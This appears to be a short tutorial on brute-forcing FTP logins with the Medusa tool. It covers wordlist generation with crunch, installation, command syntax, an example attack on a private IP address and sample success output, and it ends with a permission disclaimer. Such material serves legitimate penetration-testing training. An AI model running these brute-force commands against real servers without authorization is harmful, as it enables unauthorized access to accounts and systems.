# FTP Attack Documentation

## Introduction
This document provides a comprehensive guide on executing FTP brute force attacks using Medusa, covering everything from setup to execution and analysis of results.

## 1. Wordlist Preparation
- Create or download a wordlist for usernames and passwords. Tools like `Crunch` or `cewl` can be used for this.
- Example command to create a simple password list:
  ```bash
  crunch 3 5 abcdefghijklmnopqrstuvwxyz -o password_list.txt
  ```

## 2. Installing Medusa
Make sure `Medusa` is installed on your system. You can install it using the following command:
```bash
sudo apt-get install medusa
```

## 3. Medusa Command Overview
Medusa is used to perform brute force attacks against various services, including FTP. The basic syntax is:
```bash
medusa -h <target_ip> -u <username> -P <password_file> -M ftp
```

## 4. Attack Execution
### Example Command:
To launch an attack against an FTP server, you might use:
```bash
medusa -h 192.168.1.10 -u admin -P password_list.txt -M ftp
```
- `-h`: Specifies the target IP address.
- `-u`: Specifies the username to try.
- `-P`: Specifies the password file to use.
- `-M`: Specifies the service type (`ftp` in this case).

### 5. Result Analysis
- Medusa will provide output as it attempts to login using the credentials in your wordlist.
- Successful logins will be displayed in the terminal output.

## 6. Example Outputs
When a valid username/password combination is used, you may see output like:
```
[52] 192.168.1.10:21 - login success for user: admin password: secret123
```
This indicates that the attack was successful for that particular set of credentials.

## Conclusion
Brute force attacks should only be performed in legal and ethical contexts. Ensure you have permission before testing any systems.